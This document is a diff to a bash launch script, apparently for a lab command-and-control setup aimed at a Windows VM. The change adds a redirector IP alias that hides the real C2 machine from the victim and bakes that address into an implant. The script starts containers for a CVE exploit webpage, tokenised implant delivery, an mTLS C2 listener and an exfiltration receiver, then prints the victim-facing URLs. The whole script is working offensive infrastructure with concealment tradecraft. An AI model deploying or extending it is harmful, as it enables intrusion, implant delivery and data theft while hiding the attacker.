@@ -43,13 +43,16 @@ echo ""
 echo -e "${YELLOW}[*] Detecting network interfaces...${NC}"
 echo ""
 echo -e "    ${YELLOW}NOTE: Your Windows VM must use a Host-Only adapter in VirtualBox.${NC}"
-echo -e "    Use the ${GREEN}vboxnet0${NC} IP below as your C2_HOST_IP."
+echo -e "    The ${GREEN}vboxnet0${NC} IP is your real C2 machine IP."
+echo -e "    You will be prompted for a separate REDIRECTOR IP (an alias on the same interface)."
+echo -e "    The victim connects to the redirector IP only — your real IP stays hidden."
 echo ""
 
 # Use a more portable way to list interfaces and IPs
-mapfile -t IFACES < <(ip -o -4 addr show | awk '{print $2, $4}' | grep -v '^lo ' | grep -v '127\.')
+mapfile -t IFACES < <(ip -o -4 addr show | grep -v ' secondary ' | awk '{print $2, $4}' | grep -v '^lo ' | grep -v '127\.')
 
 HOSTONLY_IP=""
+HOSTONLY_IFACE=""
 if [ ${#IFACES[@]} -eq 0 ]; then
     echo -e "${RED}[!] No non-loopback IPv4 interfaces found.${NC}"
 else
@@ -58,15 +61,24 @@ else
         IFACE_NAME=$(echo "$iface" | awk '{print $1}')
         IFACE_IP=$(echo "$iface" | awk '{print $2}' | cut -d'/' -f1)
         if [[ "$IFACE_NAME" == vboxnet* || "$IFACE_NAME" == vmnet* ]]; then
-            echo -e "      ${GREEN}$IFACE_NAME${NC} → $IFACE_IP  ${CYAN}← recommended (host-only)${NC}"
+            echo -e "      ${GREEN}$IFACE_NAME${NC} → $IFACE_IP  ${CYAN}← your C2 machine (host-only)${NC}"
             HOSTONLY_IP="$IFACE_IP"
+            HOSTONLY_IFACE="$IFACE_NAME"
         else
             echo -e "      ${GREEN}$IFACE_NAME${NC} → $IFACE_IP"
         fi
     done
 fi
 
-# ── 3. Prompt for host IP ─────────────────────
+# Auto-suggest a redirector IP: increment the last octet by 9
+# e.g. 192.168.56.1 → 192.168.56.10
+if [ -n "$HOSTONLY_IP" ]; then
+    _BASE=$(echo "$HOSTONLY_IP" | cut -d'.' -f1-3)
+    _LAST=$(echo "$HOSTONLY_IP" | cut -d'.' -f4)
+    SUGGESTED_REDIRECTOR_IP="${_BASE}.$(((_LAST + 9) % 255))"
+fi
+
+# ── 3. Prompt for redirector IP ───────────────
 echo ""
 if [ ! -f "$ENV_FILE" ]; then
     echo -e "${YELLOW}[*] No .env file found — creating one now.${NC}"
@@ -74,19 +86,23 @@ fi
 
 CURRENT_IP=$(grep -oP '(?<=C2_HOST_IP=)\S+' "$ENV_FILE" 2>/dev/null || echo "")
 
-# Pre-fill with host-only IP if detected and no existing .env
-DEFAULT_IP="${CURRENT_IP:-$HOSTONLY_IP}"
+echo ""
+echo -e "    ${CYAN}The REDIRECTOR IP is the address baked into the implant.${NC}"
+echo -e "    ${CYAN}It will be added as an IP alias on ${HOSTONLY_IFACE:-vboxnet0} so Docker can bind to it.${NC}"
+echo -e "    ${CYAN}Victim traffic hits this IP — your real C2 IP (${HOSTONLY_IP}) stays hidden.${NC}"
+echo ""
 
 if [ -n "$CURRENT_IP" ]; then
-    echo -e "${YELLOW}[*] Current C2_HOST_IP in .env: ${GREEN}$CURRENT_IP${NC}"
-    read -rp "    Enter new host IP (or press Enter to keep '$CURRENT_IP'): " INPUT_IP
+    echo -e "${YELLOW}[*] Current redirector IP in .env: ${GREEN}$CURRENT_IP${NC}"
+    read -rp "    Enter new redirector IP (or press Enter to keep '$CURRENT_IP'): " INPUT_IP
     HOST_IP="${INPUT_IP:-$CURRENT_IP}"
-elif [ -n "$HOSTONLY_IP" ]; then
-    echo -e "${YELLOW}[*] Detected host-only adapter IP: ${GREEN}$HOSTONLY_IP${NC}"
-    read -rp "    Press Enter to use '$HOSTONLY_IP' or enter a different IP: " INPUT_IP
-    HOST_IP="${INPUT_IP:-$HOSTONLY_IP}"
+elif [ -n "$SUGGESTED_REDIRECTOR_IP" ]; then
+    echo -e "${YELLOW}[*] Your C2 machine IP: ${GREEN}${HOSTONLY_IP}${NC}"
+    echo -e "${YELLOW}[*] Suggested redirector IP: ${GREEN}${SUGGESTED_REDIRECTOR_IP}${NC}"
+    read -rp "    Press Enter to use '${SUGGESTED_REDIRECTOR_IP}' or enter a different IP: " INPUT_IP
+    HOST_IP="${INPUT_IP:-$SUGGESTED_REDIRECTOR_IP}"
 else
-    read -rp "    Enter your Linux host IP (e.g. 192.168.56.1): " HOST_IP
+    read -rp "    Enter redirector IP to use (e.g. 192.168.56.10): " HOST_IP
 fi
 
 # Validate IP format
@@ -95,9 +111,43 @@ if ! echo "$HOST_IP" | grep -qE '^([0-9]{1,3}\.){3}[0-9]{1,3}$'; then
     exit 1
 fi
 
-echo -e "${GREEN}[+] Using C2_HOST_IP=${HOST_IP}${NC}"
+# Warn if redirector IP == real C2 IP — no actual separation occurs
+if [ -n "$HOSTONLY_IP" ] && [ "$HOST_IP" = "$HOSTONLY_IP" ]; then
+    echo ""
+    echo -e "${RED}[!] Redirector IP is the same as your real C2 IP (${HOSTONLY_IP}).${NC}"
+    echo -e "    ${CYAN}This means there is NO IP separation — victim traffic will resolve directly to your C2 machine.${NC}"
+    if [ -n "$SUGGESTED_REDIRECTOR_IP" ]; then
+        echo -e "    ${CYAN}Suggested alias: ${GREEN}${SUGGESTED_REDIRECTOR_IP}${NC}${CYAN} (different address on the same interface)${NC}"
+    fi
+    echo ""
+    read -rp "    Continue with the same IP anyway? (y/N): " SAME_IP_CONFIRM
+    SAME_IP_CONFIRM="${SAME_IP_CONFIRM:-N}"
+    if [[ ! "$SAME_IP_CONFIRM" =~ ^[Yy]$ ]]; then
+        echo -e "${RED}[!] Exiting. Re-run and enter a different redirector IP.${NC}"
+        exit 1
+    fi
+    IP_SEPARATION=0
+else
+    IP_SEPARATION=1
+fi
 
-# ── 3a. Generate tokens (BP2 enrollment + BP3 download) ───────────
+echo -e "${GREEN}[+] Using redirector IP (C2_HOST_IP): ${HOST_IP}${NC}"
+
+# ── 3a. Add IP alias so Docker can bind the redirector port to HOST_IP ──
+# If HOST_IP differs from the host-only adapter's primary IP, add it as an
+# alias on the same interface.  This makes the redirector appear as a
+# distinct IP on the network — the victim never sees the real C2 machine IP.
+if [ -n "$HOSTONLY_IFACE" ] && [ "$HOST_IP" != "$HOSTONLY_IP" ]; then
+    echo ""
+    echo -e "${YELLOW}[*] Adding IP alias ${HOST_IP} on ${HOSTONLY_IFACE}...${NC}"
+    if sudo ip addr add "${HOST_IP}/24" dev "$HOSTONLY_IFACE" 2>/dev/null; then
+        echo -e "${GREEN}[+] IP alias added — victim will connect to ${HOST_IP}, not ${HOSTONLY_IP}.${NC}"
+    else
+        echo -e "${CYAN}[~] Alias already exists or could not be added (continuing).${NC}"
+    fi
+fi
+
+# ── 3b. Generate tokens (BP2 enrollment + BP3 download) ───────────
 echo ""
 echo -e "${YELLOW}[*] Generating tokens (BP2 enrollment + BP3 download)...${NC}"
 
@@ -121,7 +171,8 @@ fi
 
 # Write to .env
 cat > "$ENV_FILE" <<EOF
-# Your Linux host IP address — baked into implant.exe at build time.
+# Redirector IP — baked into implant.exe and bound to the redirector container.
+# This is an IP alias on the host-only interface, distinct from the real C2 machine IP.
 # Regenerated by launch.sh on $(date)
 C2_HOST_IP=${HOST_IP}
 
@@ -137,7 +188,7 @@ EOF
 
 echo -e "${GREEN}[+] .env written.${NC}"
 
-# ── 3b. Generate PKI (CA, controller, implant 30-day, nginx) ──────
+# ── 3c. Generate PKI (CA, controller, implant 30-day, nginx) ──────
 echo ""
 echo -e "${YELLOW}[*] Generating PKI — CA, controller cert, implant cert (30-day), nginx cert...${NC}"
 CERT_SCRIPT="$SCRIPT_DIR/certs/generate_certs.sh"
@@ -159,10 +210,11 @@ echo -e "${GREEN}[+] Ready to rebuild.${NC}"
 
 # ── 5. Check for port conflicts ───────────────
 echo ""
-echo -e "${YELLOW}[*] Checking for port conflicts (443, 8443, 8888)...${NC}"
+echo -e "${YELLOW}[*] Checking for port conflicts (443, 8443, 8888, 9443)...${NC}"
+echo -e "    ${CYAN}(Port 443 is now owned by the redirector container — c2-server has no direct host port)${NC}"
 
 CONFLICT=0
-for PORT in 443 8443 8888; do
+for PORT in 443 8443 8888 9443; do
     if ss -tlnp 2>/dev/null | grep -q ":${PORT} "; then
         echo -e "${RED}[!] Port $PORT is already in use.${NC}"
         CONFLICT=1
@@ -193,7 +245,7 @@ echo -e "${YELLOW}[*] Verifying containers started...${NC}"
 sleep 3
 
 ALL_UP=1
-for NAME in c2-server exfil-server; do
+for NAME in redirector c2-server delivery-server exploit-server exfil-receiver; do
     STATUS=$(docker inspect --format='{{.State.Status}}' "$NAME" 2>/dev/null || echo "missing")
     if [ "$STATUS" = "running" ]; then
         echo -e "    ${GREEN}[+] $NAME is running${NC}"
@@ -209,14 +261,31 @@ echo -e "${CYAN}================================================${NC}"
 echo -e "${CYAN}                    Summary                     ${NC}"
 echo -e "${CYAN}================================================${NC}"
 echo ""
-echo -e "  C2 listener (mTLS)  → ${GREEN}localhost:443${NC}   (TLS 1.3, blends with HTTPS)"
-echo -e "  Exploit webpage     → ${GREEN}http://localhost:8888${NC}"
-echo -e "  Implant delivery    → ${GREEN}https://localhost:8443/update/<token>${NC}  (HTTPS, single-use)"
+if [ "${IP_SEPARATION:-1}" -eq 1 ]; then
+echo -e "  IP separation:"
+echo -e "    Real C2 machine  → ${CYAN}${HOSTONLY_IP}${NC}  (your Linux host — victim never sees this)"
+echo -e "    Redirector IP    → ${GREEN}${HOST_IP}${NC}  (alias on ${HOSTONLY_IFACE:-vboxnet0} — baked into implant)"
+else
+echo -e "  ${RED}[!] No IP separation — redirector and real C2 are both ${HOST_IP}${NC}"
+echo -e "      Re-run and choose a different redirector IP (e.g. ${SUGGESTED_REDIRECTOR_IP:-<alias IP>}) for proper separation."
+fi
+echo ""
+echo -e "  Traffic path (C2):  victim → ${GREEN}${HOST_IP}:443${NC} (redirector) → ${GREEN}c2-server:443${NC} (backnet only)"
+echo -e "  Traffic path (exfil): implant → ${GREEN}${HOST_IP}:9443${NC} (exfil-receiver) — separate channel"
+echo ""
+echo -e "  Containers:"
+echo -e "    Machine 1 — redirector      ${GREEN}${HOST_IP}:443${NC}   socat relay (frontnet+backnet)"
+echo -e "    Machine 2 — c2-server       backnet only           mTLS C2 listener"
+echo -e "    Machine 3 — delivery-server ${GREEN}${HOST_IP}:8443${NC}  nginx implant download"
+echo -e "    Machine 4 — exploit-server  ${GREEN}${HOST_IP}:8888${NC}  CVE exploit webpage"
+echo -e "    Machine 5 — exfil-receiver  ${GREEN}${HOST_IP}:9443${NC}  HTTPS exfil data sink"
 echo ""
 echo -e "  From Windows VM:"
 echo -e "  Exploit webpage  → ${GREEN}http://${HOST_IP}:8888${NC}"
 echo -e "  Download implant → ${GREEN}https://${HOST_IP}:8443/update/${DOWNLOAD_TOKEN}${NC}  (in shellcode)"
-echo -e "  C2 connects to   → ${GREEN}${HOST_IP}:443${NC}   (baked into implant.exe)"
+echo -e "  C2 connects to   → ${GREEN}${HOST_IP}:443${NC}   (redirector alias — not the real C2 IP)"
+echo -e "  Exfil uploads to → ${GREEN}https://${HOST_IP}:9443${NC}  (separate channel, exfil-data/ on host)"
+echo -e "  Real C2 server   → ${CYAN}backnet only — unreachable from victim network${NC}"
 echo ""
 echo -e "  Attach to C2 controller:"
 echo -e "    ${CYAN}sudo docker attach c2-server${NC}"
